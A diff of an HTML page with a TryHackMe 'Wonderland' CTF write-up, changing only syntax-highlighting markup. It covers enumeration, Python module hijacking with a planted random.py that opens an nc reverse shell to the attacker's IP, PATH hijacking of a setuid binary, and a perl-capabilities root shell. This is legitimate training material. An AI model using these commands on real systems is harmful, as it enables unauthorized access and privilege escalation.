@@ -57,9 +57,9 @@
 <h1 id="tryhackme---wonderland-writeup">TryHackMe - Wonderland Writeup</h1>
 <p><img src="/img/tryhackme_wonderland/card.png" /></p>
 <p>As usual, we add the machine IP to our /etc/hosts file</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">10.10.226.99</span> wonderland.thm</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.226.99</span> wonderland.thm</span></code></pre></div>
 <h1 id="nmap-scan">Nmap Scan</h1>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="fu">nmap</span> -sC -sV -sS -oN nmap.out wonderland.thm</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out wonderland.thm</span></code></pre></div>
 <p>Open ports:</p>
 <ul>
 <li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
@@ -70,7 +70,7 @@
 <p>Going to port 80, we find a webpage.</p>
 <p><img src="/img/tryhackme_wonderland/1.png" /></p>
 <h2 id="gobuster-fuzzing">Gobuster Fuzzing</h2>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">gobuster</span> dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gobuster</span> dir <span class="at">-u</span> http://wonderland.thm/ <span class="at">-w</span> /usr/share/wordlists/dirb/common.txt</span></code></pre></div>
 <p>We find the following</p>
 <p><img src="/img/tryhackme_wonderland/2.png" /></p>
 <h2 id="img">/img</h2>
@@ -95,27 +95,27 @@
 <p>We check the sudo privileges of the user alice and find the following</p>
 <p><img src="/img/tryhackme_wonderland/8.png" /></p>
 <p>So we can run the following as the user <code>rabbit</code></p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">/usr/bin/python3.6</span> /home/alice/walrus_and_the_carpenter.py</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/python3.6</span> /home/alice/walrus_and_the_carpenter.py</span></code></pre></div>
 <p>We have a look at the python script</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="im">import</span> random</span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>poem <span class="op">=</span> <span class="st">&quot;&quot;&quot;The sun was shining on the sea,</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="st">Shining with all his might:</span></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a><span class="st">He did his very best to make</span></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a><span class="st">............................</span></span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a><span class="st">............................</span></span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a><span class="st">And that was scarcely odd, because</span></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a><span class="st">Theyd eaten every one.&quot;&quot;&quot;</span></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a></span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10</span>):</span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>    line <span class="op">=</span> random.choice(poem.split(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))</span>
-<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&quot;The line was:</span><span class="ch">\t</span><span class="st">&quot;</span>, line)</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>poem <span class="op">=</span> <span class="st">&quot;&quot;&quot;The sun was shining on the sea,</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="st">Shining with all his might:</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="st">He did his very best to make</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="st">............................</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="st">............................</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="st">And that was scarcely odd, because</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="st">Theyd eaten every one.&quot;&quot;&quot;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10</span>):</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    line <span class="op">=</span> random.choice(poem.split(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>))</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;The line was:</span><span class="ch">\t</span><span class="st">&quot;</span>, line)</span></code></pre></div>
 <p>It import the python library “random”. We can use <code>python path hijack</code> here to escalate our privileges. The script will look for the random module in its working directory first. And since we have write permissions in the working directory, we can write a script “random.py” with the function <code>choice</code> that gets called in the script, executing a reverse shell of ours to escalte the privileges. So we create a file random.py in the same directory as follows</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="im">import</span> os</span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="kw">def</span> choice(a):</span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>  os.system(<span class="st">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.17.253 1337&gt;/tmp/f&quot;</span>)</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> choice(a):</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  os.system(<span class="st">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.17.253 1337&gt;/tmp/f&quot;</span>)</span></code></pre></div>
 <p>Now we run the following as user “rabbit”</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="fu">sudo</span> -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u</span> rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span></code></pre></div>
 <p>We open up a nc listener on our host and get a shell back.</p>
 <p><img src="/img/tryhackme_wonderland/9.png" /></p>
 <h2 id="user---hatter">User - hatter</h2>
@@ -123,12 +123,12 @@
 <p><img src="/img/tryhackme_wonderland/10.png" /></p>
 <p>We see that the program has setuid as user with id=1003 which is the user “hatter”. We also notice the command executed in the binary and find that the command <code>date</code> is executed without using absolute path. So we can hijack the PATH <code>date</code> is called from, by creating an executable named “date” and adding it to the environment PATH.</p>
 <p>So we create a file named “date” in a directory /tmp/path containing</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="co">#!/bin/sh</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a></span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="fu">bash</span> -i</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-i</span></span></code></pre></div>
 <p>So, since the program is setuid, we will get an interactive bash shell as user hatter.We make it executable and add the directory to our Environment PATH</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="fu">chmod</span> 777 /tmp/path/date</span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="bu">export</span> <span class="va">PATH=</span>/tmp/path:<span class="va">$PATH</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 777 /tmp/path/date</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH=</span>/tmp/path:<span class="va">$PATH</span></span></code></pre></div>
 <p>Now, we execute the binary and get a shell as the user “hatter”</p>
 <p><img src="/img/tryhackme_wonderland/11.png" /></p>
 <p>In the home directory, we find the password for user hatter. Creds found:</p>
@@ -143,7 +143,7 @@
 <p>The privilege escalation using capabilities has been explained well at <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities">hacktricks</a></p>
 <p>We can find the privesc method using perl and its capability on <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">gtfobins</a>.</p>
 <p>Following that, we execute the following to get our root shell.</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">/usr/bin/perl</span> -e <span class="st">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/perl</span> <span class="at">-e</span> <span class="st">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</span></span></code></pre></div>
 <p>And we get the root shell. Now, we can read our root.txt.</p>
 <p><img src="/img/tryhackme_wonderland/13.png" /></p>
 <p>PS. In this box, as the hint suggests, everything is upside down, meaning root.txt is in users’ home, and user.txt is in /root.</p>
